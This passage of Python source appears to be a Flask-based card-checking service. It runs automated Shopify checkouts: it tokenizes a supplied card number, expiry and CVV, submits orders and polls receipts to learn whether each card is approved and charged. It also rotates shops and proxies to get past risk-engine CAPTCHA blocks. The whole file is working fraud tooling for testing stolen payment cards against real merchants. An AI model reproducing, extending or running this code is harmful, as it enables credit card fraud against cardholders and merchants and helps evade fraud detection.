        tax = "0.0"; amount_f = amount; shipping_required = True; r3_text = ""

        try:
            log("  Step 4: Proposal 3 (Address / Target Item)")
            p = _proposal_payload(session_token, stable_id, vid, amount, currency,
                                  email, addr, prop_id, use_lines, target_any=False)
            p["variables"]["queueToken"] = queue_token
            r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(8))

            if r3.status_code == 200:
                r3_text = r3.text
                shipping_required = _is_shipping_required(r3_text)
                log(f"  Step 4: isShippingRequired -> {shipping_required}")
                if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
                    return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
                pm_id    = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
                del_h    = _delivery_handle(r3_text)
                signed   = _signed_handles(r3_text)
                tax      = _tax_amount(r3_text)
                amount_f = _checkout_total(r3_text) or amount
                queue_token = _queue_token(r3_text) or queue_token
            else:
                return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
        except Exception as e:
            log(f"  Step 4: Proposal 3 EXC -> {str(e)[:100]}")
            return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")

        if not pm_id:
            pm_id = _payment_method_id_from_html(checkout_html)
        if not pm_id:
            return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
        if shipping_required:
            return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")

        # ═══════════════════════════════════════════════════════════════
        # Step 5: PCI
        # ═══════════════════════════════════════════════════════════════
        ident_sig = _ident_sig(checkout_html)
        v_url     = _vault_url(checkout_html)
        v_dom     = _vault_domain(checkout_html)

        log("  Step 5: Tokenizing Card")
        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}",
                        shop_url.split("//")[1], ua,
                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom,
                        proxy_url=proxy_url, t_rem=t_max(8))
        if not sid:
            return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
        log("  Step 5: PCI Token Success")

        time.sleep(random.uniform(0.3, 0.8))

        # ═══════════════════════════════════════════════════════════════
        # Step 6: SubmitForCompletion
        # ═══════════════════════════════════════════════════════════════
        sa        = _street_addr(fn, ln, addr_raw)
        price_str = f"{amount_f} {currency}"
        merch_key = "lines" if use_lines else "merchandiseLines"

        def _build_submit(cur_tax, cur_total):
            delivery_block = {
                "deliveryLines": [{
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments":              {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes":    ["NONE"],
                    "expectedTotalPrice":     {"any": True},
                    "destinationChanged":     True,
                }],
                "noDeliveryRequired":            [],
                "useProgressiveRates":           False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping":         True,
            }
            return {
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": session_token},
                        "queueToken":   queue_token,
                        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": delivery_block,
                        "deliveryExpectations": {"deliveryExpectationLines": []},
                        "merchandise": {merch_key: [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {
                                "id":                 f"gid://shopify/ProductVariantMerchandise/{vid}",
                                "variantId":          f"gid://shopify/ProductVariant/{vid}",
                                "properties":         [],
                                "sellingPlanId":      None,
                                "sellingPlanDigest":  None,
                            }},
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"value": {"amount": cur_total, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]},
                        "memberships": {"memberships": []},
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [{
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "sessionId":               sid,
                                        "paymentMethodIdentifier": pm_id,
                                        "billingAddress":          {"streetAddress": sa},
                                        "cardSource":              None,
                                    },
                                    "giftCardPaymentMethod": None, "ownedGiftCardPaymentMethod": None,
                                    "redeemablePaymentMethod": None, "walletPaymentMethod": None,
                                    "walletsPlatformPaymentMethod": None, "localPaymentMethod": None,
                                    "paymentOnDeliveryMethod": None, "paymentOnDeliveryMethod2": None,
                                    "manualPaymentMethod": None, "customPaymentMethod": None,
                                    "offsitePaymentMethod": None, "customOnsitePaymentMethod": None,
                                    "deferredPaymentMethod": None, "customerCreditCardPaymentMethod": None,
                                    "paypalBillingAgreementPaymentMethod": None, "remotePaymentInstrument": None,
                                },
                                "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
                            }],
                            "billingAddress": {"streetAddress": sa},
                            "creditCardBin":  ccn[:6],
                            "allowStoreCredit": False,
                        },
                        "buyerIdentity": {
                            "customer":          {"presentmentCurrency": currency, "countryCode": "US"},
                            "email":             email,
                            "emailChanged":      False,
                            "phoneCountryCode":  "US",
                            "marketingConsent":  [{"email": {"consentState": "DECLINED", "value": email}}],
                            "shopPayOptInPhone": {"number": "", "countryCode": "US"},
                            "rememberMe":        False,
                        },
                        "tip":      {"tipLines": []},
                        "poNumber": None,
                        "taxes": {
                            "proposedAllocations":           None,
                            "proposedTotalAmount":           {"value": {"amount": cur_tax, "currencyCode": currency}},
                            "proposedTotalIncludedAmount":   None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions":            [],
                        },
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms":    None,
                        "scriptFingerprint": {
                            "signature": None, "signatureUuid": None,
                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
                            "shippingScriptChanges": [],
                        },
                        "optionalDuties": {"buyerRefusesDuties": False},
                        "cartMetafields": [],
                    },
                    "attemptToken": f"{cart_token}-{_rand_suffix()}",
                    "metafields":   [],
                    "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())},
                },
                "operationName": "SubmitForCompletion",
                "id": submit_id,
            }

        body    = ""
        cur_tax = tax or "0.0"
        cur_tot = amount_f

        log("  Step 6: Submitting Order")
        for tax_attempt in range(3):
            try:
                r_submit = session.post(
                    f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                    json=_build_submit(cur_tax, cur_tot), headers=hdr,
                    timeout=t_max(10),
                )
                body = r_submit.text
            except Exception as e:
                return _fail("SUBMIT_EXC", shop=shop_url, err=str(e)[:100])

            if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body or "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
                log("  Step 6: Tax changed, retrying...")
                nt = _tax_from_rejected(body)
                nT = _total_from_rejected(body)
                if nt: cur_tax = nt
                if nT: cur_tot = nT
                price_str = f"{cur_tot} {currency}"
                continue
            break

        log(f"  Step 6: Submit Response -> {body[:400]}")

        # ═══════════════════════════════════════════════════════════════
        # Step 7: PollForReceipt — full raw response, strict budget
        # ═══════════════════════════════════════════════════════════════
        rid = _receipt_id(body)
        rss = _receipt_session(body) or session_token

        if not rid:
            return _resp_submit(body, price=price_str, status="NO_RECEIPT",
                                elapsed_ms=elapsed() * 1000)

        log(f"  Step 7: Polling receipt {rid[:50]}...")
        poll_headers = hdr.copy()
        poll_headers["accept-language"] = "en-US"

        poll_start = time.monotonic()
        last_pb    = ""
        last_http  = None
        all_pb     = []

        for poll_attempt in range(1, 8):
            if (time.monotonic() - poll_start) > 25:
                log(f"  Step 7: Poll window exhausted at attempt {poll_attempt}")
                break
            if remain() < 5:
                log(f"  Step 7: Budget low at attempt {poll_attempt}")
                break

            time.sleep(1.5)

            poll_data = {
                "variables":     {"receiptId": rid, "sessionToken": rss},
                "operationName": "PollForReceipt",
                "id":            poll_id,
            }

            try:
                r_p = session.post(
                    f"{shop_url}/checkouts/internal/graphql/persisted?operationName=PollForReceipt",
                    headers=poll_headers, json=poll_data, timeout=t_max(8),
                )
                pb        = r_p.text
                last_pb   = pb
                last_http = r_p.status_code
                all_pb.append({"attempt": poll_attempt, "http": r_p.status_code, "body": pb})
                log(f"    Poll {poll_attempt}/10: HTTP {r_p.status_code} | FULL RESPONSE:")
                log(f"    {pb}")

                compact = pb.replace(" ", "")

                if '"__typename":"ProcessedReceipt"' in compact:
                    log("  Step 7: ✅ ORDER PLACED")
                    return _resp_poll(
                        pb, price=price_str, poll_attempt=poll_attempt,
                        http_status=r_p.status_code,
                        status="ORDER_PLACED",
                        success=True, approved=True, charged=True,
                        elapsed_ms=elapsed() * 1000,
                    )

                if '"__typename":"FailedReceipt"' in compact:
                    code = _code(pb) or "CARD_DECLINED"
                    status, apv, chg = _classify_failed(code)
                    if status == "CAPTCHA_REQUIRED":
                        log("  Step 7: ⚠️ CAPTCHA_REQUIRED — Shopify risk engine blocked.")
                        log("  Step 7:    → this shop is flagged; try a different one")
                        log("  Step 7:    → do NOT reuse this shop this cycle")
                    else:
                        log(f"  Step 7: ❌ FAILED -> {status}")
                    return _resp_poll(
                        pb, price=price_str, poll_attempt=poll_attempt,
                        http_status=r_p.status_code,
                        status=status,
                        success=False, approved=apv, charged=chg,
                        elapsed_ms=elapsed() * 1000,
                    )

                if '"__typename":"ActionRequiredReceipt"' in compact:
                    log("  Step 7: 🔔 3DS_REQUIRED (challenge, not an order)")
                    return _resp_poll(
                        pb, price=price_str, poll_attempt=poll_attempt,
                        http_status=r_p.status_code,
                        status="3DS_REQUIRED",
                        success=False, approved=False, charged=False,
                        elapsed_ms=elapsed() * 1000,
                    )

                log(f"    Poll {poll_attempt}: still processing, continuing...")

            except Exception as e:
                log(f"    Poll {poll_attempt}: EXC -> {str(e)[:120]}")
                continue

        log("  Step 7: Polling exhausted")
        return jsonify({
            "Response":   "POLL_EXHAUSTED",
            "Code":       "POLL_EXHAUSTED",
            "Gate":       "Shopify Payments",
            "Charged":    "False",
            "Approved":   "False",
            "Price":      price_str,
            "success":    False,
            "PollAttempt": len(all_pb),
            "FullPollResponse":  last_pb,
            "AllPollResponses":  all_pb,
            "PollHttpStatus":    last_http,
            "Time": str(int(elapsed() * 1000)),
        })

    except Exception as e:
        log(f"❌ TOP EXC: {str(e)[:150]}")
        return _fail("TOP_EXC", shop=shop_url, err=str(e)[:150])
    finally:
        try:
            session.close()
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# 🌐 ROUTES
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/")
def route_check():
    _inc_busy()
    try:
        card  = request.args.get("card")
        proxy = request.args.get("proxy", "")
        if not card:
            return _resp("MISSING_CARD")
        return _run_check(card, proxy)
    except Exception as e:
        return _fail("ROUTE_EXC", err=str(e)[:150])
    finally:
        _dec_busy()


@app.route("/health")
def route_health():
    with _workers_lock:
        busy = _workers_busy
    return jsonify({"status": "ok", "workers_busy": busy, "workers_cap": WORKERS_CAP})


@app.route("/debug")
def route_debug():
    with _log_lock:
        logs_copy = list(_check_logs)
    return jsonify({"last_failure": _last_failure, "logs": logs_copy})


@app.route("/sites")
def route_sites():
    with _PRODUCT_LOCK:
        total = len(_PRODUCTS_LIST)
        pool  = len(_PRODUCT_POOL)
    with _USED_SHOPS_LOCK:
        used = len(_USED_SHOPS)
    unique = len({p["shop"] for p in _PRODUCTS_LIST}) if _PRODUCTS_LIST else 0
    return jsonify({
        "total_products":         total,
        "unique_shops":           unique,
        "pool_remaining":         pool,
        "shops_used_this_cycle":  used,
        "shops_left_this_cycle":  max(0, unique - used),
        "cap_warning": (
            f"concurrency should be ≤ {unique}"
            if unique > 0 else "no products loaded"
        ),
    })


# ─────────────────────────────────────────────────────────────────────────────
# ▶️ ENTRY
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[NODE] starting on 0.0.0.0:{port} cap={WORKERS_CAP} budget={BUDGET_SEC}s", flush=True)
    app.run(host="0.0.0.0", port=port, threaded=True)
